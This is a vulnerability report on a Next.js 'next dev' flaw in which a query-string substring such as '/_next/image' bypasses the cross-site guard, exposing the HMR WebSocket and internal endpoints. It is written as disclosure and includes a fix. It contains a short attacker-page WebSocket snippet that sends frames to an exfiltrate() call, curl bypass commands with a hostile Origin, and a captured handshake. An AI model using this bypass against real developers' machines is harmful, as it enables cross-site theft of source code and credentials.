# Next.js `next dev` — total bypass of `blockCrossSiteDEV` via `isInternalEndpoint()`'s substring ignore-list: cross-site source-code theft over the HMR WebSocket

**Component** `packages/next/src/server/lib/router-utils/block-cross-site-dev.ts` — `isInternalEndpoint()`
**Target** `next@16.3.4` (`299180d331`), `next dev` (both Turbopack and Webpack dev servers)
**Class** CWE-352 (CSRF) via CWE-697 (incorrect comparison) — a substring test applied to the whole raw URL — leading to CWE-200 (cross-origin exposure of source code and secrets)
**Status** Reproduced end to end in real headless Chromium from a genuinely cross-site origin. **This also re-opens the already-patched `CVE-2026-27977` / `GHSA-jcc7-9wpm-mj36`** (`Origin: null`), verified directly.

## Summary

Every internal dev-server endpoint — `/__nextjs_*`, `/_next/*`, and the HMR WebSocket upgrade — is guarded by `blockCrossSiteDEV()`. Before that guard does anything, it asks whether the request is an internal one at all:

```ts
function isInternalEndpoint(req: IncomingMessage): boolean {
  if (!req.url) return false
  try {
    const isMiddlewareRequest = req.url.includes('/__nextjs')
    const isInternalAsset = req.url.includes('/_next')
    // Static media requests are excluded, as they might be loaded via CSS and would fail
    // CORS checks.
    const isIgnoredRequest =
      req.url.includes('/_next/image') ||
      req.url.includes('/_next/static/media') ||
      req.url.includes('/_next/static/immutable/media')

    return !isIgnoredRequest && (isInternalAsset || isMiddlewareRequest)
  } catch (err) { return false }
}
```

```ts
// blockCrossSiteDEV, first thing it does:
if (!isInternalEndpoint(req)) {
  return false        // not blocked
}
```

`req.url` is the **raw request target — path *and* query string**. The three ignore-list tests are plain `String.prototype.includes` against that whole string, not against the resolved pathname. So appending any query parameter whose *value* contains `/_next/image` makes `isIgnoredRequest` true, `isInternalEndpoint` return `false`, and `blockCrossSiteDEV` return "not blocked" — **before it ever looks at `Origin`, `Referer`, `Sec-Fetch-*`, or the method**.

```
GET /__nextjs_attach-nodejs-inspector?x=/_next/image
```

The exemption exists for a good reason (`<img>`/CSS loads of optimized images and static media legitimately fail CORS checks), but it is applied by searching the entire URL rather than by matching the route being served.

## What this defeats

The check is not weakened, it is **switched off**. Every one of its branches is skipped, for every request shape:

| | plain URL | `&x=/_next/image` appended |
|---|---|---|
| `Origin: http://evil.test` on `/__nextjs_launch-editor` | `403` | **`204`** |
| `Origin: http://evil.test` on `/__nextjs_attach-nodejs-inspector` | `403` | **`200`** |
| `Origin: null` on `/__nextjs_launch-editor` | `403` | **`204`** |
| `POST` `/_next/mcp` (`tools/list`), `Origin: http://evil.test` | `403` | **`200`** |
| HMR WebSocket upgrade, `Origin: http://evil.test` | rejected | **upgrade accepted** |

`/_next/static/media` and `/_next/static/immutable/media` work identically as the magic substring.

The `Origin: null` row is exactly the case `CVE-2026-27977` / `GHSA-jcc7-9wpm-mj36` ("null origin can bypass dev HMR websocket CSRF checks") was issued and patched for. That patch hardened the `Origin`-comparison logic further down the function; this bypass never reaches it, so the fixed behaviour is available again.

## Impact: cross-site theft of the developer's source code

The severe consequence is the **HMR WebSocket**, because a WebSocket is *not* subject to the Same-Origin Policy. The browser attaches `Origin` and leaves enforcement entirely to the server — that server-side enforcement is precisely `blockCrossSiteDEV`. With it bypassed, an attacker's page opens the socket and its own JavaScript reads every frame. There is no opaque-response barrier here, unlike the CSRF gaps that only permit fire-and-forget side effects.

Confirmed in real headless Chromium (`poc/drive_ws_leak.js`). An attacker page on `attacker.test` runs three lines:

```js
const ws = new WebSocket('ws://victimdev.test:3020/_next/hmr?x=/_next/image');
ws.onmessage = (e) => exfiltrate(e.data);
```

The socket opens. The developer then does something entirely ordinary in their own editor — mistypes a closing brace — and the dev server pushes the build error, which carries **a source-code frame of the offending file**, to every connected HMR client, the attacker included:

```
{"type":"built","hash":"3","errors":[{"message":"./app/page.js:3:1
Error: Expected '}', got '<eof>'
  1 | const API_KEY = "sk-live-51H9xQ2rTvB8mNpK4wZ"
  2 | export default function Home() { return <main>nextlab home</main >
> 3 |
Parsing ecmascript source code failed
"}],"warnings":[]}
```

The hardcoded credential on line 1 was never touched by the typo — it is simply in the code frame's context window. Every syntax error the developer makes, for as long as the malicious tab stays open, ships a window of surrounding source to the attacker. Build errors are not an edge case; they are the normal minute-to-minute state of an editing session.

The handshake Chromium actually put on the wire, captured by a transparent TCP relay (`poc/cap.js`) so the bytes are Next.js's own view, unmodified:

```
GET /_next/hmr?x=/_next/image HTTP/1.1
Host: victimdev.test:3021
Upgrade: websocket
Origin: http://attacker.test:8899
Sec-WebSocket-Key: vQBbbMexWqZq66e/tbFqlQ==
```

An explicit, genuinely cross-site `Origin` — accepted.

### Everything else the bypass re-exposes

* **The unauthenticated dev MCP server** (`/_next/mcp`, `mcpServer` defaults to `true`) answers cross-origin POST, exposing `get_project_metadata` (absolute project path), `get_logs` (log file path), `get_routes`, `get_server_action_by_id`, `get_compilation_issues`, and `compile_route`. A browser cannot *read* these replies — no CORS headers are sent and the preflight 405s — but any non-browser attacker with network reach to the dev port can, and a browser can still fire the side-effecting ones blind.
* **`/__nextjs_attach-nodejs-inspector`**, which opens the Node.js V8 Inspector Protocol — a full RCE interface — now with an explicit hostile `Origin` rather than only via navigation shape (see `../dev-csrf-inspector-rce-2026-09-04`).
* **`/__nextjs_launch-editor`**, the arbitrary-path existence oracle and forced editor-open documented in `../dev-launch-editor-path-oracle-2026-09-04`, likewise now reachable by any request shape.

## Relationship to my two other reports on this dev server

These are three distinct defects and I am reporting them separately on purpose:

* `../dev-csrf-inspector-rce-2026-09-04` — `blockCrossSiteDEV` treats an **absent** `Origin` as same-site, so navigation-shaped GETs pass. That is a gap *inside* the check.
* `../dev-launch-editor-path-oracle-2026-09-04` — `openFileInEditor()` applies **no path containment**. That is a file-handling defect independent of any CSRF control.
* **This report** — `isInternalEndpoint()` decides the check does not apply at all. This one **subsumes the first in reach** (any method, any `Origin`, including `null`) and is what turns the second from an oracle into part of a fully unauthenticated toolkit.

The first report honestly recorded that it could not demonstrate a cross-origin *read*, because SOP kept the navigated response away from the attacker's script. This bypass supplies exactly that missing primitive through the WebSocket, which SOP does not cover.

## Reproduction

```
# victim: developer running `next dev` on victimdev.test:3020
# attacker: an ordinary page on attacker.test:8899

node poc/ws_test.js         # HMR upgrade rejected on a plain URL, accepted with the bypass
node poc/drive_ws_leak.js   # real Chromium: attacker.test reads the developer's source
sh  poc/evidence_run.txt    # (transcript, not a script) full annotated run
```

Minimal one-liner for the control itself:

```
curl -H 'Origin: http://evil.test' 'http://localhost:3020/__nextjs_attach-nodejs-inspector'                 # 403
curl -H 'Origin: http://evil.test' 'http://localhost:3020/__nextjs_attach-nodejs-inspector?x=/_next/image'  # 200
```

## Suggested fix

Decide the exemption from the **resolved pathname**, not from a substring of the raw URL — the same `new URL(req.url, 'http://n').pathname` the endpoint handlers themselves already use — and match it with `startsWith` against the exempt prefixes rather than `includes`:

```ts
const { pathname } = new URL(req.url, 'http://n')
const isIgnoredRequest =
  pathname.startsWith('/_next/image') ||
  pathname.startsWith('/_next/static/media') ||
  pathname.startsWith('/_next/static/immutable/media')
```

The same substitution should be made for the `isInternalAsset` / `isMiddlewareRequest` tests, which have the mirror-image problem: a non-internal route whose query string happens to contain `/_next` is currently pulled *into* the check.

## Scope

* **`next dev` only.** `blockCrossSiteDEV` is called from `router-server.ts` at three sites (two request paths and the WebSocket upgrade handler), all under `opts.dev`. Production (`next start`, `output: standalone`) does not run this code.
* Realistic exposure is the threat model this control was written for: developers keep `next dev` running for hours while browsing the web in the same browser. `allowedDevOrigins` and the CVE-2026-27977 fix both exist to address it.

## Files

| file | what it is |
|---|---|
| `poc/ws_test.js` | HMR WebSocket upgrade with a hostile `Origin`, with and without the bypass |
| `poc/drive_ws_leak.js` | the full browser demonstration: attacker page opens the socket, developer makes a typo, source code arrives cross-site |
| `poc/ws_captured_messages.json` | every frame the attacker page actually read off the victim's dev server |
| `poc/cap.js` | transparent TCP relay used to capture Chromium's exact handshake bytes without modifying Next.js |
| `poc/blank.html` | attacker-origin document the PoC pages load |
| `poc/evidence_run.txt` | full annotated run: control behaviour, the bypass across every endpoint class, the MCP tool list, the WebSocket upgrade, the source leak, the captured handshake |

## Lab

`next@16.3.4`, Node v22.22.2, `next dev` on port 3020 (port 3021 fronts it with `poc/cap.js` purely to capture wire bytes; Next.js itself was never modified). Chromium 1194 via Playwright, headless, launched with `--no-proxy-server` — this container has an outbound HTTP proxy in its environment which Chromium otherwise routes `ws://` through, and that proxy returns its own `403`, which is not Next.js's response and would misread as the control working. `/etc/hosts` maps `attacker.test` and `victimdev.test` to `127.0.0.1` so Chromium's site boundary treats them as genuinely cross-site; same-IP-different-port is not sufficient, since `127.0.0.1`/`localhost` are also in `blockCrossSiteDEV`'s always-allowed list.
